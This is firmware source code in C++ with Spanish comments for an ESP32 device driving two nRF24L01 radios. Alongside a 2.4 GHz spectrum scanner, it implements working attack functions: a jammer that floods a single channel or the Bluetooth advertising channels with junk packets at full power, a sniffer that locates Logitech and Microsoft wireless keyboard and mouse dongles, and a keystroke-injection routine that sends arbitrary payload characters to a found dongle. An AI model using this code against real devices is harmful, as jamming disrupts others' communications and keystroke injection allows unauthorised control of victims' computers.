#include "nrf24_module.h"
#include "serial_protocol.h"

NRF24Module NRF24;

const uint8_t NRF24Module::BLE_CHS[3]  = {2, 26, 80};
const uint8_t NRF24Module::WIFI_CHS[3] = {1, 6, 11};

bool NRF24Module::begin() {
    pinMode(PIN_NRF1_CS, OUTPUT);
    digitalWrite(PIN_NRF1_CS, HIGH);
    pinMode(PIN_NRF2_CS, OUTPUT);
    digitalWrite(PIN_NRF2_CS, HIGH);
    
    memset(_junk, 0xFF, sizeof(_junk));
    delay(50);

    // Inicializar Radio 1 (Scanner)
    _nrf1Ready = _initRadio(_nrf1, PIN_NRF2_CS);

    // Inicializar Radio 2 (Jammer)
    _nrf2Ready = _initRadio(_nrf2, PIN_NRF1_CS);

    _ready = (_nrf1Ready || _nrf2Ready);

    if (_ready) {
        Serial.printf("[NRF24] Redundancia activa. Radio1: %s, Radio2: %s\n", 
                      _nrf1Ready ? "OK" : "FALLÓ", 
                      _nrf2Ready ? "OK" : "FALLÓ");
    }
    
    _mode = NRF_IDLE;
    return _ready;
}

bool NRF24Module::_initRadio(RF24& radio, uint8_t otherCS) {
    digitalWrite(otherCS, HIGH); // Aislar la otra radio del bus SPI
    delay(5);
    if (!radio.begin()) {
        return false;
    }
    radio.setAutoAck(false);
    radio.setRetries(0, 0);
    radio.setPALevel(RF24_PA_LOW); // Mantenemos LOW para estabilidad en pruebas
    radio.setDataRate(RF24_1MBPS); 
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.setPayloadSize(32);
    
    delay(10);
    return true;
}

RF24& NRF24Module::_getAvailableRadio() {
    if (_nrf1Ready) return _nrf1;
    return _nrf2; 
}

void NRF24Module::_releaseAll() {
    if (_nrf1Ready) _nrf1.stopListening();
    if (_nrf2Ready) _nrf2.stopListening();
    _mode = NRF_IDLE;
    delay(5);
}

void NRF24Module::scanSpectrum(JsonDocument& doc) {
    if (!_ready) return;
    _releaseAll();

    RF24& radio = _getAvailableRadio();
    radio.powerUp(); 
    delay(2); 

    // Forzamos tasa de datos baja para máxima sensibilidad física
    radio.setDataRate(RF24_250KBPS); 
    radio.setPALevel(RF24_PA_MAX);   
    delay(2);

    uint8_t result[NRF_CHANNELS] = {0};

    for (int ch = 0; ch < NRF_CHANNELS; ch++) {
        radio.setChannel(ch);
        radio.startListening();
        
        // Tiempo mínimo para el enganche del sintetizador analógico
        delayMicroseconds(130); 
        
        // ⚡ MUESTREO AGRESIVO: 200 lecturas directas al registro SPI a máxima velocidad
        for (int sample = 0; sample < 200; sample++) {
            if (radio.testRPD()) { 
                result[ch]++; // Acumulamos persistencia
            }
        }
        
        radio.stopListening();
        if (ch % 16 == 0) yield(); // Evita alimentar el Watchdog del ESP32
    }

    // Retornamos el estado original para el sniffer HID
    radio.setDataRate(RF24_1MBPS);
    radio.setPALevel(RF24_PA_LOW);

    JsonArray arr = doc["channels"].to<JsonArray>();
    int peakCh = 0;
    int peakVal = 0;

    for (int i = 0; i < NRF_CHANNELS; i++) {
        arr.add(result[i]);
        if (result[i] > peakVal) {
            peakVal = result[i];
            peakCh = i;
        }
    }

    doc["peak_channel"] = peakCh;
    doc["peak_freq_mhz"] = 2400 + peakCh;
    doc["peak_value"] = peakVal;
}

bool NRF24Module::scanHID(JsonDocument& doc) {
    if (!_ready) return false;
    _releaseAll();

    RF24& radio = _getAvailableRadio();
    radio.powerUp();
    delay(5);
    radio.setAutoAck(false);
    radio.setAddressWidth(2);
    radio.setCRCLength(RF24_CRC_DISABLED);
    radio.setDataRate(RF24_1MBPS);
    radio.openReadingPipe(0, 0xAAAAAAAAAAULL);

    uint8_t buf[32];
    bool found = false;
    uint32_t start = millis();

    while (millis() - start < 3000 && !found) {
        for (uint8_t ch = 2; ch <= 84; ch++) {
            radio.setChannel(ch);
            radio.startListening();
            
            delayMicroseconds(200); 
            
            if (radio.available()) {
                radio.read(buf, 32);
                
                bool pureZeros = true;
                for (int i = 0; i < 5; i++) {
                    if (buf[i] != 0x00) { pureZeros = false; break; }
                }
                
                if (!pureZeros) {
                    char addr[16];
                    snprintf(addr, sizeof(addr), "%02X%02X%02X%02X%02X", buf[0], buf[1], buf[2], buf[3], buf[4]);

                    doc["found"] = true;
                    doc["address"] = addr;
                    doc["channel"] = ch;
                    doc["manufacturer"] = _guessVendor(buf);
                    found = true;
                    radio.stopListening();
                    break;
                }
            }
            radio.stopListening();
        }
        yield();
    }

    if (!found) doc["found"] = false;
    return found;
}

void NRF24Module::startMonitor() {
    if (!_ready) return;
    _releaseAll();
    memset(_spectrum, 0, sizeof(_spectrum));
    
    RF24& radio = _getAvailableRadio();
    radio.powerUp();
    delay(5);
    _mode = NRF_SCANNER;
}

void NRF24Module::stopMonitor() {
    _releaseAll();
}

void NRF24Module::monitorTick() {
    if (_mode != NRF_SCANNER || !_ready) return;

    RF24& radio = _getAvailableRadio();

    for (int ch = 0; ch < NRF_CHANNELS; ch++) {
        radio.setChannel(ch);
        radio.startListening();
        
        delayMicroseconds(130); 

        uint8_t val = radio.testRPD() ? 1 : 0;
        radio.stopListening();

        if (_spectrum[ch] == 0 && val > 0) {
            JsonDocument ev;
            ev["channel"] = ch;
            ev["freq_mhz"] = 2400 + ch;
            Protocol.sendEvent("NRF24", "SPECTRUM_ALERT", ev);
        }
        _spectrum[ch] = val;
    }
}

void NRF24Module::startJammer(JamMode mode, uint8_t channel) {
    if (!_ready) return;
    _releaseAll();
    
    _jamMode = mode;
    _jamCh = channel;
    _mode = NRF_JAMMER;

    RF24& radio = _nrf2Ready ? _nrf2 : _nrf1;
    radio.powerUp();
    delay(5);
    radio.stopListening(); // Modo TX puro de alta ganancia
    
    // ⚡ AJUSTES DE POTENCIA MÁXIMA DE HARDWARE
    radio.setPALevel(RF24_PA_MAX);   // Forzamos 0dBm de salida (Máximo del chip)
    radio.setDataRate(RF24_250KBPS); // Concentra la densidad de potencia en el canal
}

void NRF24Module::stopJammer() {
    _releaseAll();
}

void NRF24Module::jamTick() {
    if (_mode != NRF_JAMMER || !_ready) return;

    RF24& radio = _nrf2Ready ? _nrf2 : _nrf1;

    if (_jamMode == JAM_SINGLE) {
        radio.setChannel(_jamCh);
        // Transmisión directa sin pausas al buffer de salida
        radio.startFastWrite(_junk, 32, true); 
        _packetsSent++;
    } 
    else if (_jamMode == JAM_CARPET) {
        // ⚡ CARPET OPTIMIZADO: Solo barremos los canales canónicos de Bluetooth/WiFi
        // en lugar de dispersar la energía por frecuencias vacías
        for (uint8_t i = 0; i < 3; i++) {
            uint8_t targetCh = BLE_CHS[i]; // Usa tus constantes fijas {2, 26, 80}
            radio.setChannel(targetCh);
            
            // Bombardeo rápido en ráfaga antes de saltar de canal
            for(int r = 0; r < 5; r++) {
                radio.startFastWrite(_junk, 32, true);
                _packetsSent++;
            }
        }
        yield(); // Alimentamos el Watchdog del ESP32 una vez por ciclo completo
    }
}

void NRF24Module::jamStatus(JsonDocument& doc) {
    doc["active"] = (_mode == NRF_JAMMER);
    doc["nrf1_present"] = _nrf1Ready;
    doc["nrf2_present"] = _nrf2Ready;
    doc["redundancy_active"] = (_nrf1Ready && _nrf2Ready);
    doc["channel"] = _jamCh;
    doc["packets_sent"] = _packetsSent;
}

String NRF24Module::_guessVendor(uint8_t* addr) {
    switch (addr[0]) {
        case 0xCD:
        case 0x45: return "Logitech";
        case 0xBF:
        case 0xF5: return "Microsoft";
        default:   return "Unknown";
    }
}

bool NRF24Module::injectHID(const char* addrHex, uint8_t ch, const char* payload, JsonDocument& doc) {
    if (!_ready) return false;
    _releaseAll();

    RF24& radio = _getAvailableRadio();
    radio.powerUp();
    delay(5);
    radio.stopListening();
    radio.setChannel(ch);
    radio.setAutoAck(false);
    radio.setDataRate(RF24_1MBPS);

    uint8_t addr[5];
    sscanf(addrHex, "%02hhX%02hhX%02hhX%02hhX%02hhX", &addr[0], &addr[1], &addr[2], &addr[3], &addr[4]);
    radio.openWritingPipe(addr);

    int sent = 0;
    for (int i = 0; payload[i]; i++) {
        uint8_t pkt[32] = {0};
        pkt[0] = payload[i];
        radio.write(pkt, 32);
        delay(5);
        sent++;
    }
    doc["success"] = true;
    doc["chars_sent"] = sent;
    
    return true;
}
